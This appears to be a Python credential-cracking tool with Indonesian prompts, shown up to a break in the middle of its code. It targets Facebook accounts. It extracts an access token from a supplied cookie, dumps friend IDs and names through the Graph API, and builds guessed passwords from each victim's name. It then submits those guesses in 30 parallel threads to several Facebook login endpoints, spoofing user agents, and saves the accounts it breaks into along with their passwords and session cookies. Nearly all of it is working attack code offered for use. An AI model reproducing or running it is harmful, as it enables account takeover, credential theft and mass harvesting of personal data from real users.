# SCRIPT BY FIRMAN
# script free yang ngejual parah sih
# ga usah repot-repot ngedec udah open source
# hargai yang punya script jangan ubah print/banner jadi nama mu
# donate ada gak chat wa yang ngedonate 😁
import requests,json,os,sys,random,datetime,time,re,platform,subprocess
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich import print as cetak
from rich.panel import Panel as nel
id,id2,uid = [],[],[]
tokene = []
user = []
user2 = []
user3 = []
ling = []
next = []
pwpluss = []
pwnya = []
akunyeh = []
loop,zar = 0,[]
ok,cp,oo = 0,0,[]
ses = requests.Session()
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

P = '\x1b[1;97m'  # Putih
M = '\x1b[1;91m'  # Merah Terang
H = '\x1b[1;92m'  # Hijau Terang
K = '\x1b[1;93m'  # Kuning Terang
B = '\x1b[1;94m'  # Biru Terang
U = '\x1b[1;95m'  # Ungu Terang
O = '\x1b[1;96m'  # Biru Muda
N = '\x1b[0m'     # Normal
Z = "\033[1;30m"  # Hitam
sir = '\033[41m\x1b[1;97m'  # Latar Belakang Merah
x = '\33[m'  # Default
m = '\x1b[1;91m'  # Merah
k = '\033[93m'  # Kuning
h = '\x1b[1;92m'  # Hijau
hh = '\033[32m'  # Hijau Gelap
u = '\033[95m'  # Ungu
kk = '\033[33m'  # Kuning Gelap
b = '\33[1;96m'  # Biru
p = '\x1b[0;34m'  # Biru Gelap
mer = '\033[1;31m'  # Merah Gelap
kun = '\033[1;33m'  # Kuning Gelap
hijo = '\033[1;32m'  # Hijau Gelap
biru = '\033[1;34m'  # Biru Gelap
ung = '\033[1;35m'  # Ungu Gelap
puti = '\033[1;37m'  # Putih
bira = '\033[1;36m'  # Biru Muda
xxx = '\33[m'
pan ="\033[41m\x1b[1;97m >>>\033[0m"

def cokzar():
    try:
        os.system('clear')
        banlog()
        piliha = f" {x}ketik {h}y {x}untuk login cookie\n ketik {h}c{x} untuk cara ambil cookie"
        cetak_panel(piliha, 40)
        pilihan = input(f' input: ')
        if pilihan.lower() == 'y':
            cok = {'cookie': input(f' ENTER COOKIE :{h} ')}
            link = ses.get('https://www.facebook.com/adsmanager/manage/campaigns' , cookies = cok).text
            gx = re.search("act=(.*?)&nav_source",str(link)).group(1)
            get = ses.get('https://www.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(gx), cookies = cok).text
            tok = re.search('accessToken="(.*?)"',str(get)).group(1)
            open(".tokzar.txt", "w").write(tok)
            open(".cokzar.txt", "w").write(cok['cookie'])
            print('\nToken : {}'.format(tok))
            exit()
        elif pilihan.lower() == 'c':
            zahra_animasi2(f'\n{xxx}   {h}sedang buka telegram')
            waktu(3)
            os.system("xdg-open https://t.me/cara_ambil_cookie")
            log_zar()
        else:
            print('Pilihan tidak valid')
            time.sleep(3)
            cokzar()
    except(Exception) as e:
        print('Cookies Mokad') ; time.sleep(3)
        print(e)
        log_zar()


def log_zar():
    try:
        token = open('.tokzar.txt','r').read()
        cok = open('.cokzar.txt','r').read()
        tokene.append(token)
        try:
            gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokene[0], cookies={'cookie':cok})
            nteng = json.loads(gerap.text)['id']
            zara(nteng)
        except KeyError:
            cokzar()
        except requests.exceptions.ConnectionError:
            exit()
    except IOError:
        cokzar()
def file():
    try:
        pilihan = f" apakah kamu ingin memilih\n repositori DUMP default sc? (y/n)"
        cetak_panel(pilihan, 40)
        pilih_repositori = input("input: ")
        if pilih_repositori.lower() == 'n':
            pilihan = f" {h}Masukkan nama repositori DUMP sesuai\n ripostori mu\n contoh {x}/storage/emulated/0/Download/"
            cetak_panel(pilihan, 40)
            repositori = input("input: ")
        else:
            repositori = '/storage/emulated/0/ZAHRA-DUMP'  
        vin = os.listdir(repositori)
    except FileNotFoundError:
        print(f'{pan} File Tidak Ditemukan ')
        time.sleep(2)
        log_zar()
    if len(vin) == 0:
        print(f'{pan} Kamu Tidak Memiliki File Dump ')
        time.sleep(2)
        log_zar()
    else:
        cih = 0
        lol = {}
        for isi in vin:
            try:
                hem = open(repositori + '/' + isi, 'r').readlines()
            except:
                continue
            cih += 1
            if cih < 100:
                nom = '' + str(cih)
                lol.update({str(cih): str(isi)})
                lol.update({nom: str(isi)})
                print(f' {nom}. {isi} ({h} {len(hem)} idz {x})')
            else:
                lol.update({str(cih): str(isi)})
                print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                print(f'{pan} {cih}. {isi} ({h} {len(hem)} {x}idz) ')
        geeh = input(f'\n{pan} input : ')
        print('')
        try:
            geh = lol[geeh]
        except KeyError:
            print(f'{pan} Pilih Yang Bener sayang')
            time.sleep(3)
            log_zar()
        try:
            lin = open(repositori + '/' + geh, 'r').read().splitlines()
        except:
            print(f'{pan} File Tidak Ditemukan, Coba Lagi Nanti ')
            time.sleep(2)
            log_zar()
        for xid in lin:
            id.append(xid)
        zar_atur()
def res():
	print('')
	print(f'{pan} 1. Hasil CP Anda ')
	print(f'{pan} 2. Hasil OK Anda ')
	print(f'{pan} 0. Kembali	')
	kz = input(f'\n{pan} input : ')
	print('')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f'{pan} File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f'{pan} Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input(f'\n{pan} input : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{pan} Pilih Yang Bener sayang ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f'{pan} File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{pan}CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			input(f'\n{pan} Back Enter ')
			log_zar()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f'{pan} File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f'{pan} Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input(f'\n{pan} input : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{pan} Pilih Yang Bener sayang ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f'{pan} File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'\n{pan}OK\033[32m {cpkuni[0]}|{cpkuni[1]}|\033[32m{cpkuni[2]}\033[0m')
				nocp +=1
			input(f'\n{pan} Back Enter ')
			log_zar()
	elif kz in ['0','00']:
		log_zar()
	else:
		printf('{pan} Pilih Yang Bener sayang ')
		exit()

def zahra_animasi(berjalan):
    for gas in berjalan + "\n":
        sys.stdout.write(gas)
        sys.stdout.flush()
        time.sleep(0.05)
def zahra_animasi2(berjalan):
    for gas in berjalan + "\n":
        sys.stdout.write(gas)
        sys.stdout.flush()
        time.sleep(0.10)
def zahra_animasi3(berjalan):
    for gas in str(berjalan) + "\n":
        sys.stdout.write(gas)
        sys.stdout.flush()
        time.sleep(0.01)
def anime(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.20)
def cetak_panel(teks, lebar):
    garis_atas = (f'{h}~{xxx}') * lebar
    teks_tengah = teks.center(lebar)
    garis_bawah = (f'{h}~{xxx}') * lebar

    panel = f"{garis_atas}\n{teks_tengah}\n{garis_bawah}"
    print(panel)
def banzar():
    zahra_animasi3(f'''{xxx}

................................................
.{m}%%%%%%{xxx}..{m}%%%%%%{xxx}..{m}%%%%%{xxx}...{h}%%%%%%{xxx}...{h}%%%%{xxx}...{h}%%{xxx}..{h}%%{xxx}.
.{m}%%{xxx}........{m}%%{xxx}....{m}%%{xxx}..{m}%%{xxx}.....{h}%%{xxx}...{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}.
.{m}%%%%{xxx}......{m}%%{xxx}....{m}%%%%%{xxx}.....{h}%%{xxx}....{h}%%%%%%{xxx}..{h}%%%%%%{xxx}.
.{m}%%{xxx}........{m}%%{xxx}....{m}%%{xxx}..{m}%%{xxx}...{h}%%{xxx}.....{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}.
.{m}%%{xxx}......{m}%%%%%%{xxx}..{m}%%{xxx}..{m}%%{xxx}..{h}%%%%%%{xxx}..{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}..{h}%%{xxx}.
................................................
''')

def banlog():
    print('''\x1b[1;92m
         _____   ______ _____ __   _     
 |      |     | |  ____   |   | \  |     
\33[m |_____ |_____| |_____| __|__ |  \_| 
''')

def zara(id):
    try:
        cok = open('.cokzar.txt','r').read()
    except IOError:
        cokzar()
    os.system('clear')
    banzar()
    pilihan = f" {xxx}1. crack\n 2. crack file\n 3. dump file\n 4. cek hasil crack\n 5. lapor bug ({h}WhatsApp{xxx}){xxx}"
    cetak_panel(pilihan, 40)
    zahra = input(f' input: ')
    if zahra == '1':
        print(f'{xxx}')
        uid = input('  ENTER ID: ').split(',')
        for x in uid:
            nge_krek2(x, '')
    elif zahra == '2':
        file()
    elif zahra == '3':
        asi()
    elif zahra == '4':
        res()
    elif zahra == '5':
        os.system("xdg-open https://wa.me/+6283170597744?text=halo+kak")
        log_zar()
    else:
        log_zar()
def asi():
    try:
        print(f'')
        print(f'{xxx} 1. DUMP ID{h} 61.10009.10008')
        print(f'{xxx} 2. DUMP SEMUA ID{xxx}')
        zahraa = input(f'{xxx}>> : ')
        if zahraa == '1':
            print(f'{xxx}')
            uid = input('  ENTER ID: ').split(',')
            for x in uid:
                nge_krek(x, '')
        elif zahraa == '2':
            print(f'{xxx}')
        uid = input('  ENTER ID: ').split(',')
        for x in uid:
            nge_krek1(x , '')
        else:
            asi()
    except Exception as e:
        print(f'Error: {e}')
        

def nge_krek(uidz, after):
    try:
        tok = open('.tokzar.txt', 'r').read()
        cok = {'cookie': open('.cokzar.txt', 'r').read()}
    except IOError:
        exit()
    
    try:
        if len(id) == 0:
            params = {
                'access_token': tok,
                'fields': 'friends'
            }
        else:
            params = {
                'access_token': tok,
                'fields': 'friends.after({})'.format(after)
            }
        
        po = ses.get('https://graph.facebook.com/{}'.format(uidz), params=params, cookies=cok).json()
        
        for x in po['friends']['data']:
            id_prefix = x.get('id')[:2]
            id_prefix5 = x.get('id')[:5]
            if id_prefix == '61' or id_prefix5 in ('10009', '10008'):
                id.append(x.get('id') + '|' + x.get('name'))
                print("  TOTAL ID: " + str(len(id)), end='\r')
        
        afr = po['friends']['paging']['cursors']['after']
        nge_krek1(uidz, afr)
    except KeyError:
        pass
    
    simpan()

def nge_krek1(uidz , after):
    try:
        tok = open('.tokzar.txt','r').read()
        cok = {'cookie':open('.cokzar.txt','r').read()}
    except IOError:
        exit()
    try:
        if len(id)==0:
            params = {
              'access_token': tok,
              'fields': 'friends'
            }
        else:
            params = {
              'access_token': tok,
              'fields': 'friends.after({})'.format(after)
            }
        po = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
        for x in po['friends']['data']:
            id.append(x.get('id')+'|'+x.get('name'))
            print("  TOTAL ID : "+str(len(id)) , end = '\r') 
        afr = po['friends']['paging']['cursors']['after']
        nge_krek1(uidz , afr)
    except(KeyError) as e:
        pass
    simpan()
    
def nge_krek2(uidz , after):
    try:
        tok = open('.tokzar.txt','r').read()
        cok = {'cookie':open('.cokzar.txt','r').read()}
    except IOError:
        exit()
    try:
        if len(id)==0:
            params = {
              'access_token': tok,
              'fields': 'friends'
            }
        else:
            params = {
              'access_token': tok,
              'fields': 'friends.after({})'.format(after)
            }
        po = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
        for x in po['friends']['data']:
            id.append(x.get('id')+'|'+x.get('name'))
            print("  TOTAL ID : "+str(len(id)) , end = '\r') 
        afr = po['friends']['paging']['cursors']['after']
        nge_krek2(uidz , afr)
    except(KeyError) as e:
        pass
    zar_atur()
    
def simpan():
    while True:
        zahra_animasi(f'\n{xxx}   ({h}Mau disimpan di repositori mana?{xxx})')
        zahra_animasi(f'{xxx}   ({h}CONTOH: {xxx}/storage/emulated/0/Download/{xxx})')
        zahra_animasi(f'{xxx}   ({h}atau Ketik "{xxx}y{h}" untuk simpan otomatis{xxx})')
        zahra_animasi(f'{xxx}   ({h}DI: {xxx}/storage/emulated/0/ZAHRA-DUMP/{xxx})')
        repo_dir = input(' Input: ')
        
        if repo_dir.lower() == 'y':
            repo_dir = '/storage/emulated/0/ZAHRA-DUMP/'
            if not os.path.isdir(repo_dir):
                os.mkdir(repo_dir)
            break
        elif not os.path.isdir(repo_dir):
            print('Direktori repositori tidak valid. Silakan coba lagi.')
        else:
            break

    zahra_animasi(f'\n{xxx}   ({h}Nama file contoh sayang.txt{xxx})')
    file_name = input(' Input: ')

    file_path = os.path.join(repo_dir, file_name)

    with open(file_path, 'w') as file:
        for uid in id:
            file.write(uid + '\n')

    zahra_animasi(f' disimpan di repositori {h}{file_path}')
    exit()
    
def zar_atur():
    print(f'{xxx}')
    pilih = (f'   [[{hijo}CRACK DARI ID{xxx}]]\n 1. [{m}TUA{x}]\n 2. [{h}MUDA{x}]\n 3. [{b}ACAK{x}]')
    cetak_panel(pilih, 40)
    zarid = input(f'{xxx} input: ')
    if zarid in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif zarid in ['2','02']:
        xbaru=[]
        for baru in sorted(id):
            xbaru.append(baru)
        bkp=len(xbaru)
        bkpp=(bkp-1)
        for miyabi in range(bkp):
            id2.append(xbaru[bkpp])
            bkpp -=1
    elif zarid in ['3','03']:
        for acak in id:
            xnxx = random.randint(0,len(id2))
            id2.insert(xnxx,acak)
    else:
        zahra_animasi2(f' KETIK YANG BENER SAYANG')
        exit()
    pilih= (f'   [[{hijo}METODE LOGIN{xxx}]]\n{x} 1. free.facebook.com [{h}validate{x}]\n 2. free/mbasic.facebook.com [{h}validate{x}]\n 3. mbasic.facebook.com [{h}validate{x}]\n 4. m.facebook.com [{u}async{x}]\n 5. free.facebook.com [{b}regular{x}]')
    cetak_panel(pilih, 40)
    zar_metode = input(f'{xxx} input: ')
    if zar_metode in ['1','01']:
        zar.append('metode1')
    elif zar_metode in ['2','02']:
        zar.append('metode2')
    elif zar_metode in ['3','03']:
        zar.append('metode3')
    elif zar_metode in ['4','04']:
        zar.append('metode4')
    elif zar_metode in ['5','05']:
        zar.append('metode5')
    else:
        zar.append('metode1')
    pilih = (f' {x}Sandi Tambahan[{m}Y{x}/{h}T{x}]{x}')
    cetak_panel(pilih, 40)
    pwplus = input(f'{xxx} input: ')
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
        print(' Masukkan Katasandi Tambahan Minimal 6 Karakter')
        print(f' Gunakan Koma Jika Ingin menggunakan lebih dari 1 Sandi')
        print(f' Contoh {h} akusayangkamu,bismillah,jodoh123')
        pwku = input(f' {x}Masukkan sandi: ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    
    pilih = (f'   [[{hijo}PILIH USER AGENT{xxx}]]\n 1. ANDROID RANDOM\n 2. RANDOM\n 3. SAMSUNG')
    cetak_panel(pilih, 40)
    zar_ua = input(f'{x} input: ')
    if zar_ua in ['1','01']:
        zar.append('ua1')
        apaci('ua1')
    elif zar_ua in ['2','02']:
        zar.append('ua2')
        apaci('ua2')
    elif zar_ua in ['3','03']:
        zar.append('ua3')
        apaci('ua3')
    else:
        zar.append('ua1')
        apaci('ua1')
def apaci(user_agent):
    global prog, des
    print(f'{x} mode pesawatkan {h}10detik {x}setiap{h} 4/5menit\n')
    prog = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(), TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('', total=len(id))
    with prog:
        with tred(max_workers=30) as gas_krek:
            for yuzong in id2:
                idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                zar_password = ['kamunanya','katasandi']
                pwt = []
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        zar_password.append(nmf)
                        zar_password.append(frs+'123')
                        zar_password.append(frs+'1234')
                        zar_password.append(frs+'12345')
                        zar_password.append(frs+'01')
                        zar_password.append(frs+'02')
                        zar_password.append(frs+'03')
                        zar_password.append(frs+'04')
                        zar_password.append(frs+'05')
                        zar_password.append(frs+'06')
                        zar_password.append(frs+'07')
                        zar_password.append(frs+'08')
                        zar_password.append(frs+'09')
                        zar_password.append(frs+'321')
                else:
                    if len(frs) < 3:
                        zar_password.append(nmf)
                    else:
                        zar_password.append(nmf)
                        zar_password.append(frs+'123')
                        zar_password.append(frs+'1234')
                        zar_password.append(frs+'12345')
                        zar_password.append(frs+'01')
                        zar_password.append(frs+'02')
                        zar_password.append(frs+'03')
                        zar_password.append(frs+'04')
                        zar_password.append(frs+'05')
                        zar_password.append(frs+'06')
                        zar_password.append(frs+'07')
                        zar_password.append(frs+'08')
                        zar_password.append(frs+'09')
                        zar_password.append(frs+'321')
                if 'ya' in pwpluss:
                    for xpwn in pwnya:
                        zar_password.append(xpwn)
                else:
                    pass
                if 'metode1' in zar:
                    gas_krek.submit(crack, idf, zar_password, user_agent)
                elif 'metode2' in zar:
                    gas_krek.submit(crack2, idf, zar_password, user_agent)
                elif 'metode3' in zar:
                    gas_krek.submit(crack3, idf, zar_password, user_agent)
                elif 'metode4' in zar:
                    gas_krek.submit(crack4, idf, zar_password, user_agent)
                elif 'metode5' in zar:
                    gas_krek.submit(crack5, idf, zar_password, user_agent)
                else:
                    gas_krek.submit(crack, idf, zar_password, user_agent)
        print(f'{xxx}')
        print(f'{hijo} {puti}AKUN BERHASIL LOGIN: {hijo}%s{xxx} ' % (ok))
        print(f'{kun} {puti}AKUN CHEKPOINT : {kun}%s{xxx} ' % (cp))
        print(f'{xxx}')
        exit()
def crack(idf,pwx,user_agent):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	ua = random.choice(user)
	ua2 = random.choice(user2)
	ua3 = random.choice(user3)
	prog.update(des,description=f'\r{h}1 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	for pw in pwx:
		try:
			asu = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fmobile.facebook.com%2Ffxreauth%2F%3Fapp_id%3D124024574287414%26etoken%3DAbiLkrpOJAYU1HCKjo_sES6FCaeT3YwE9U3O_IOhtIDM7VUJbgQm19sIzL2OIXGCxANiStL8q2GKog%26account_id%3D'+idf+'%26force_logout%3D0&flow=fx_reauth&wtsid=rdr_0ekeE270djyhq83Ys&refsrc=deprecated&_rdc=1&_rdr')
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(asu.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(asu.text)).group(1),
	        "uid":idf,
	        "next": "https://free.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			kue = (";").join([ "%s=%s" % (key, value) for key, value in asu.cookies.get_dict().items() ])		
			head={
    'Host': 'free.facebook.com',
    'Connection': 'keep-alive',
    'Content-Length': '363',
    'Cache-Control': 'max-age=0',
    'dpr': '2.75',
    'viewport-width': '980',
    'sec-ch-ua': "'Chromium';v='122', 'Not(A:Brand';v='24', 'Android WebView';v='122'",
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': 'Android',
    'sec-ch-ua-platform-version': '',
    'sec-ch-ua-model': '',
    'sec-ch-ua-full-version-list': '',
    'sec-ch-prefers-color-scheme': 'dark',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://free.facebook.com',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': ua if 'ua1' in zar else ua2 if 'ua2' in zar else ua3,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fmobile.facebook.com%2Ffxreauth%2F%3Fapp_id%3D124024574287414%26etoken%3DAbiLkrpOJAYU1HCKjo_sES6FCaeT3YwE9U3O_IOhtIDM7VUJbgQm19sIzL2OIXGCxANiStL8q2GKog%26account_id%3D'+idf+'%26force_logout%3D0&flow=fx_reauth&wtsid=rdr_0ekeE270djyhq83Ys&refsrc=deprecated&_rdc=1&_rdr',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
			po = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0", headers=head, data=date, cookies={'cookie': kue}, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel(f'\r {x}[{b}CHEKPOINT{x}]{x}\n TAHUN BUAT {k}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {k}{idf}{x}\n {xxx}PASSWORD {k}{pw}{x}\n {x}USER {k}{ua}\n {x}USER2 {k}{ua2}\n {x}USER3 {k}{ua3}{N}'))
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cetak(nel(f'\r {x}[{b}BERHASIL LOGIN{x}]{x}\n TAHUN BUAT {x}{h}{cektahun(idf)}{x}\n{xxx} GMAIL/NO {h}{idf}{x}\n {xxx}PASSWORD {h}{pw}{x}\n {xxx}COOKIE {h}{kukis}{x}\n {x}USER {h}{ua}\n {x}USER2 {h}{ua2}\n {x}USER3 {h}{ua3}{N}'))
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
# ENCRYPTED SECTION
def crack2(idf,pwx,user_agent):
	global loop,ok,cp
	prog.update(des,description=f'\r{h}2 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	rr = random.randint
	rc = random.choice
	ua = random.choice(user)
	ua2 = random.choice(user2)
	ua3 = random.choice(user3)
	ses = requests.Session()
	for pw in pwx:
		try:
			fb = random.choice(['free.facebook.com','mbasic.facebook.com'])
			asu = ses.get(f"https://{fb}/login.php?skip_api_login=1&api_key=323875317805907&kid_directed_site=0&app_id=323875317805907&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D323875317805907%26cbt%3D1701110206896%26e2e%3D%257B%2522init%2522%253A1701110206896%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D49bb0dc9-1117-4292-81cb-fa13ca34776e%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%2522aa5e46d9-1d9f-49ac-8590-cf72f192db78%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522rdagej3rhcvfvfmc7mec%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.jp.dena.showroom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DKzSef5xZTSOJz1CjQ1_y6bT1-VzK6nEnwxHQmJukpiQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daa5e46d9-1d9f-49ac-8590-cf72f192db78%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.jp.dena.showroom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522aa5e46d9-1d9f-49ac-8590-cf72f192db78%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522rdagej3rhcvfvfmc7mec%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(asu.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(asu.text)).group(1),
	        "uid":idf,
	        "next": f"https://{fb}/v14.0/dialog/oauth?cct_prefetching=0&client_id=323875317805907&cbt=1701110206896&e2e=%7B%22init%22%3A1701110206896%7D&ies=1&sdk=android-14.1.1&sso=chrome_custom_tab&nonce=49bb0dc9-1117-4292-81cb-fa13ca34776e&scope=openid%2Cpublic_profile&state=%7B%220_auth_logger_id%22%3A%22aa5e46d9-1d9f-49ac-8590-cf72f192db78%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22rdagej3rhcvfvfmc7mec%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.jp.dena.showroom&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=KzSef5xZTSOJz1CjQ1_y6bT1-VzK6nEnwxHQmJukpiQ&ret=clear_history_reengagement&fbapp_pres=0&logger_id=aa5e46d9-1d9f-49ac-8590-cf72f192db78&tp=unspecified&paipv=0&eav=AfYeVTfCtiV3Bpm8eO0smFXwFMqhh-CWP8L4UDn4l1Vtq48e_-xjKL8zykXeV-8-_Jc&_rdr&ref=clear_history_reengagement&app_id=323875317805907",
	        "flow":"login_no_pin",
	        "pass":pw,
	        }
			kue = (";").join([ "%s=%s" % (key, value) for key, value in asu.cookies.get_dict().items() ])		
			head = {
    'Host': fb,
    'cache-control': 'max-age=0',
    'upgrade-insecure-requests': '1',
    'origin': f'https://{fb}',
    'content-type': 'application/x-www-form-urlencoded',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': ua if 'ua1' in zar else ua2 if 'ua2' in zar else ua3,
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'dpr': f'{str(rr(1,5))}',
    'viewport-width': f'{str(rr(300,999))}',
    'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
    'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
    'sec-ch-prefers-color-scheme': 'dark',
